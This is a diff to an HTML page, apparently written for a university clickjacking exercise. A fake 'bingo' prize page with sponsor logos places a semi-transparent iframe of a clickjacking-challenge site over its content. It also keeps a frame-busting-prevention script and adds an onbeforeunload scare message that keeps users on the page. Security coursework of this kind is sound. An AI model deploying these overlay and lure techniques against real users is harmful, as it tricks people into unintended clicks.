@@ -11,19 +11,16 @@
 		<title>Safe browser 3</title>
 	</head>
 
-<!-- 	<script type="text/javascript">
+<!--  	<script type="text/javascript">
 	    var prevent_bust = 0  
 	    window.onbeforeunload = function() { prevent_bust++ }  
 	    setInterval(function() {  
 	    	if (prevent_bust > 0) {  
 	    		prevent_bust -= 2  
-	    		window.top.location = "http://students.washington.edu/sangkim1/info415/INFO415_ClickJacking3/"
-	    		//window.top.location = "http://students.washington.edu/sangkim1/info415/INFO415_ClickJacking3"  
-	    		//window.top.location = return new HttpStatusCodeResult(HttpStatusCode.NoContent);
-
+	    		window.top.location = "???"
 	     	};
 	    }, 1);
-	</script> -->
+	</script>  -->
 	<body>
 		<div class="container">
 			<div class="jumbotron" style="height:230px; padding-top: 10px">
@@ -31,12 +28,12 @@
             	<h5 style="text-align: center"><br>Find the <b>Different DB Friend</b> from the bingo!<br>The unique DB friend will take you to the <b>Event Page</b> for your winning prize! Good Luck!</h5>
             	<h4 style="padding-left: 100px; display:inline-block;">Sponsored by: &nbsp;&nbsp;&nbsp;&nbsp;</h4><img src="img/fb.png" /><img src="img/amazon.png" /><img src="img/boeing.png" /><h4 style="display:inline-block;">&nbsp;&nbsp;&nbsp;</h4><img src="img/ischool.png" />
             </div>
-
-            <div id="cj" style="z-index:3; position:absolute; top:0; left:0; width: 1px; height:1px"> 
-				<iframe src="students.washington.edu/sangkim1/info415/INFO415_ClickJacking3/" style="opacity:0.5;filter:alpha(opacity=40); height: 1" scrolling="no" frameborder="none" idth="1" height="1"> 
-				</iframe>
-	        </div> 
-
+            <script>
+				window.onbeforeunload = function()
+				{
+				  return "STAY HERE! you will lose all of your records for winning prize!";
+				}
+			</script>
 			<div id="cj" style="z-index:2; position:absolute; top:21.5em; left:310px; width: 500px; height:200px"> 
 				<iframe src="http://clickjacking-challenges.r7.io/level/3?name=sangkim1" style="opacity:0.5;filter:alpha(opacity=40); height: 200px" scrolling="no" frameborder="none" idth="500px" height="200px"> 
 				</iframe>
